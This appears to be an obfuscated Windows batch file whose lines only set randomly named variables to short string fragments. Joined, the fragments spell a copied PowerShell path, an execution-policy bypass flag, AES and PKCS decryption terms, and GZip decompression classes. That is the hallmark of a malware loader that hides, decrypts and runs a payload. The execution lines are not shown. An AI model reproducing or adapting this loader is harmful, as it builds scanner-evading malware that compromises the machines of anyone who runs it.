@echo off
set "EqhKFchcOC=nd"
set "hgfjoEneHr=Po"
set "BwlLiumdec=rs"
set "meJbjyIOiv= C"
set "TvHxfdZQrY=:\"
set "YmMzcIOcaL=ll"
set "AXHiWEGwPh= /"
set "JJEHXldvFG=32"
set "TIcIpRhoZg=.e"
set "wMZqSItyxh=s\"
set "JXPPWaIeys=ll"
set "kSzRXQldoJ=he"
set "otahBXNjCb=po"
set "VWbOFlaobX=st"
set "jllPHwgrQo=1."
set "sCmvFMbWSG=we"
set "rYdmozLkKH=\W"
set "hQdYabXLRd=co"
set "LJezQAcvyO=xe"
set "IewzaFUEEY=in"
set "qNhjXPMOJl=\v"
set "KUszQfrWHO=he"
set "hrtrAcvbTR=rS"
set "DVAdeUFUoR=0\"
set "lxgVtlrtRt=do"
set "MhFMjBQRBf=y "
set "siDwjFVVpj=ow"
set "rzRHuUShSc=we"
set "hFJvGiVZme=ws"
set "aCsvmvCqom=py"
set "tELlDcUBJa=Wi"
set "EgeiQDnXRd=Sy"
set "gYmAESrQRW=em"
set "mgIVbiwdON= %~dp0"
set "unFncBJPaU=cd"
set "ZOqZimZjIA=] -j"
set "dUurxFFDaq=Fina"
set "SZzsjPIhVD=ptog"
set "QHbDMKqUWN=;$LF"
set "hphbLKoTpw=.GZi"
set "IEhPYgbDlI=)) {"
set "dqtVdyaLtn=Syst"
set "WisLfDvMjE=1] -"
set "vEKLQHUlBC=ress"
set "SDOadkIMkq=();$"
set "DrWPHWWxmb=$BRE"
set "TQgHlqoFGT=yrIn"
set "atAqGItglq=;$LF"
set "jDWAwNTBwL=HwWS"
set "FOZcpZIwml=bstr"
set "aFTtKspfAv=eMVs"
set "hlsrfvAjdc= [st"
set "UhAVYqgzga=HIg."
set "uVOIIXQLul= '')"
set "vmlnGIjACZ=HXFO"
set "eDJBafRrEi=.Mod"
set "VNUUtEDEde=Comp"
set "mzMVzjmuaV=Disp"
set "AhBpqpXmze=);$T"
set "ZnyouSJbkF=tion"
set "HrOzgwPTOQ=-ep "
set "sdqJNVZmDp=]::C"
set "WXLCeUkktt=O.Pa"
set "SbVGLFYoQv=y.Pa"
set "rCvqWXRVMD==');"
set "JamjXOyYpq=::De"
set "OblhvevFOJ=rqDo"
set "WrkiHQcvxO=dj0C"
set "CikmYaUTuv=tem."
set "PJRgisIgqS=esMa"
set "LeCdsPpvDZ=106u"
set "mThQzQLHGb=m.IO"
set "XSHKaiuifN=pStr"
set "nxmdmtJctw=]::N"
set "DTNBiOYtIB=Mode"
set "EDRKMtFIxW=ewLi"
set "DRwMyumraE=[]] "
set "qqEEYtKIIo=-joi"
set "cHtpMhJsxP=.Sec"
set "TKHzvJvhyF=PKCS"
set "nEowoHwuon=stem"
set "sahhREtqQP=null"
set "DvJVgiLnKN=HXFO"
set "DtANwWkfWc=sion"
set "mrZVdKoXxl= New"
set "SCcSTElUIf=zuZI"
set "DTqgdoOBGw=..-1"
set "JAaXNfnxsq=tem."
set "QSExDRYmnS=ert]"
set "XIRNrQpQkW=stem"
set "IjMismUZmo=.IO."
set "dopHlZnqPa=rofi"
set "ZjxtgOGDVq=am;$"
set "lltcKTXlIY=in $"
set "ciHOGpBpsl=k; }"
set "mbpdFhoobf= [Sy"
set "vDpwIThcWp=ose("
set "ftpLIjSByX=New-"
set "pPkSipNtwW=yste"
set "ezjqUGMKlv=YxVw"
